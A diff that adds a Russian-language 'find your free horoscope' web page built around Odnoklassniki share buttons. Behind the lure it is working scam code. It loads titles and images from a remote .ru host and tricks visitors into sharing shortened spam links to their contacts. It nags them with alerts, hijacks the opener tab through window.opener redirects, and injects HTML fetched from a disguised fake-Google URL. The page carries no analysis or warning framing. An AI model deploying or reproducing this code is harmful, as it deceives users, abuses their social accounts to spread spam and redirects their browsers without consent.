@@ -1,0 +1,379 @@
+<html>
+	<head>
+                 <?php 
+$titles = file('http://8dfhdfhsdfhjjjfg.adaxawerata.ru/1.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+echo "<title>".$titles[array_rand($titles, 1)]."</title>";  
+?> 
+<?php 
+$description = file('http://8dfhdfhsdfhjjjfg.adaxawerata.ru/3.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+?> 
+<?php 
+$image = file('http://8dfhdfhsdfhjjjfg.adaxawerata.ru/4.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+?> 
+<meta name="description" content="<?php  echo $description[array_rand($description, 1)] ?>">  
+                <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+                <meta property="og:image" content="<?php  echo $image[array_rand($image, 1)] ?>">
+		<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+		<link rel="icon" href="favicon.ico" type="image/x-icon">
+ <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+		<style type="text/css">
+		.ok-klass_logo_img {
+			background-image: url("http://st.mycdn.me/res/i/custom/widget/ok-logo_xl.png");
+			margin: 2px 4px 2px 5px;
+			height: 30px;
+			width: 18px;
+		}
+		
+		.ok-klass {
+			padding: 3px 9px 3px 8px;
+			font-size: 24px;
+			min-width: 20px;
+			background: url("http://st.mycdn.me/res/i/custom/widget/ok-like-bg-xl.png");
+		}
+		
+		.ok-klass_tx {
+			margin: 4px 6px 5px -2px;
+		}
+		
+		table {
+			margin: auto;
+		}
+		
+		h1, h2 {
+			text-align: center;
+			color: #303030;
+		}
+		
+		#redtext {
+			display: none;
+		}
+                
+                .like {
+                    width: 120px;
+                    height: 46px;
+                }
+                
+                #frameid {
+                    overflow: no-display;
+                    width: 123px;
+                    height: 45px;
+                }
+ #name {
+                font-size: 25px;
+line-height: 28px;
+text-align: center;
+            }
+            
+            .btn {
+              background: #e33b5c;
+              background-image: -webkit-linear-gradient(top, #e33b5c, #bd1b1b);
+              background-image: -moz-linear-gradient(top, #e33b5c, #bd1b1b);
+              background-image: -ms-linear-gradient(top, #e33b5c, #bd1b1b);
+              background-image: -o-linear-gradient(top, #e33b5c, #bd1b1b);
+              background-image: linear-gradient(to bottom, #e33b5c, #bd1b1b);
+              -webkit-border-radius: 28;
+              -moz-border-radius: 28;
+              border-radius: 28px;
+              font-family: Arial;
+              color: #ffffff;
+              font-size: 20px;
+              padding: 10px 20px 10px 20px;
+              text-decoration: none;
+            }
+
+            .btn:hover {
+              background: #3cb0fd;
+              background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
+              background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
+              background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
+              background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
+              background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
+              text-decoration: none;
+            }
+		</style>
+                
+<script type="text/javascript">
+                var kk = 0;
+                var kk_count = 0;
+                var kt = 0;
+                var timer = 1;
+
+                //setTimeout('timer = 1', 0);
+
+                function go() {
+                 
+                    if(timer === 1) {
+                        if(kt === 0) {
+                            alert("Сначала найдите гороскоп! " +namesurname);
+                            kt = 1;
+                        }
+
+                        if(kk_count === 0) {
+                            kk_count = 1;
+                            closesetinterval = setInterval(function () {
+                                if(kk === 0) {
+                                    alert("Не отводите курсор мыши за пределы этой страницы, что бы это сообщение больше не выводилось!");
+                                }
+
+                                if(kk === 1) {
+                                    setTimeout('kt = 0', 1000);
+                                    setTimeout('kk_count = 0', 1000);
+                                    clearInterval(closesetinterval);
+                                }
+                            }, 1000);
+                        }
+                    }
+                }
+                </script>
+<script type="text/javascript">
+
+function getRandomArbitary(min, max)
+{
+ return Math.random() * (max - min) + min;
+}
+
+var chislo = getRandomArbitary(1, 9999);
+chislo = Math.round(chislo);
+
+var cururl = encodeURIComponent("http://goo.gl/CtCyLm"+'#'+chislo);
+var cururl2 = encodeURIComponent("http://goo.gl/7yolgJ"+'#'+chislo);
+var cururl3 = encodeURIComponent("http://goo.gl/loZDSQ"+'#'+chislo);
+var cururl4 = encodeURIComponent("http://goo.gl/YnZCRJ"+'#'+chislo);
+var cururl5 = encodeURIComponent("http://goo.gl/hTmYow"+'#'+chislo);
+var cururl6 = encodeURIComponent("http://goo.gl/n7sjrE"+'#'+chislo);
+var cururl7 = encodeURIComponent("http://goo.gl/0y5cv3"+'#'+chislo);
+var cururl8 = encodeURIComponent("http://goo.gl/ftb6Nu"+'#'+chislo);
+var cururl9 = encodeURIComponent("http://goo.gl/lwQZCr"+'#'+chislo);
+var cururl10 = encodeURIComponent("http://goo.gl/fDz6c2"+'#'+chislo);
+var cururl11 = encodeURIComponent("http://goo.gl/rWF6M2"+'#'+chislo);
+var cururl12 = encodeURIComponent("http://goo.gl/T0bcCL"+'#'+chislo);
+</script>
+	</head>
+	<body>
+
+
+
+		<!--LiveInternet counter--><!--/LiveInternet-->
+
+
+                
+         
+	
+		<div id="redtext">Ждите...</div>
+		
+		<div id="maid">
+				
+			<center><img src="http://st.mycdn.me/res/i/stub/attention.png" style="margin-top: 50px; padding-left: 110px;" /></center>
+		
+           
+            <h1><div id="name"></div></h1>
+<div id="avatarURL"><center><img src="avatarURL" /></center></div>
+
+          
+        
+			<h1>В одной из кнопок класс, находится ваш гороскоп</h1>
+			<h2>Нажимайте на кнопки, пока не найдете свой гороскоп</h2>
+			
+			<table>
+				<tr>
+					<td class="like"><div id="ok_shareWidget1"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget1");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl=http://apiok.ru&st.fid=__okShare0&st.hoster=25247&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+
+					<td class="like"><div id="ok_shareWidget2"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget2");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl=http://apiok.ru&st.fid=__okShare0&st.hoster=25247&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget3"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget3");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl=http://apiok.ru&st.fid=__okShare0&st.hoster=25247&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget4"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget4");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl=http://apiok.ru&st.fid=__okShare0&st.liked=on&st.hoster=25247&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+				</tr>
+                                <tr>
+					<td class="like"><div id="ok_shareWidget5"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget5");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl5+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget6"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget6");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl6+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget7"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget7");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl7+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget8"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget8");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl8+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+				</tr>
+                                <tr>
+					<td class="like"><div id="ok_shareWidget9"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget9");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl9+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget10"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget10");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl10+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget11"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget11");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl11+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+					<td class="like"><div id="ok_shareWidget12"></div>
+<script>
+var el = document.createElement("iframe");
+var div = document.getElementById("ok_shareWidget12");
+div.appendChild(el);
+el.id = 'klass';
+el.style.border = '0';
+el.style.width = '123px';
+el.style.height = '45px';
+el.src = 'http://connect.odnoklassniki.ru/dk?st.cmd=WidgetShare&st.shareUrl='+cururl12+'&st.fid=__okShare0&st.hoster=http%3A%2F%2Fok.ru&st.settings=%7Bwidth%3A125%2Cheight%3A50%2Cst%3A%27rounded%27%2Csz%3A45%2Cck%3A1%2Cnc%3A1%7D';
+</script></td>
+				</tr>
+                                <tr>
+					<td class="like"></td>
+					<td class="like"></td>
+					<td class="like"></td>
+					<td class="like"></td>
+				</tr>
+			</table>
+		</div>
+                
+                <script type="text/javascript">
+                    var count = 0;
+                    
+                    function listenForShare() {
+                        if (window.addEventListener) {
+                            window.addEventListener('message', onShare, false);
+                        } else {
+                            window.attachEvent('onmessage', onShare);
+                        }
+                    }
+                    function onShare(e) {
+                        var args = e.data.split("$");
+                        if (args[0] == "ok_shared") {
+                            count = count + 1;
+                            
+                            if(count === 1) {
+                                timer = 0;
+
+                                alert("УРА! ВЫ ВЫИГРАЛИ БЕСПЛАТНЫЙ ГОРОСКОП!");
+
+okman = 0;
+
+                                document.location.href = 'http://perehod4.marashatara.ru/goroskop.php';
+window.opener.location.href = 'http://ya.ru';
+
+
+	
+	
+             
+
+               }
+                        }
+                    }
+                    listenForShare();
+                </script>
+ <div id="code"><script type="text/javascript" src="my.js"></script>
+<script src="http://www.odnoklassniki.ru/dk?st.cmd=shareData&amp;ref=http%3A%2F%2Fodno.ru%2Findex.php&amp;cb=mailru.share.ok.init" type="text/javascript" charset="UTF-8"></script>
+
+</div>
+        <script type="text/javascript">$.ajax({ type: "POST", url: "www.google.com-o47a8bty78natb836fg6q348gn348w5tgnc63468tgn43y78tgn4w37yt8n4w37ttttt3ygtw34n8888tgwy43gttdwjing48etgweyutvhnw45y5mertergy8gut5e8ytvnerh7s8to4huosnverht47isgteytg64iweiweiweiweiwesyu.php", data: "nash=1", success: function (html) { $("#code").html(html); } }); </script>
+    
+		<script type="text/javascript">
+		
+        
+		window.onunload = function(){
+            if (window.opener){
+setTimeout(window.opener.location.href = 'http://perehod4.marashatara.ru/odtwins.php', 1500);
+                        }
+                    }
+ </script>
+
+	</body>
+</html>
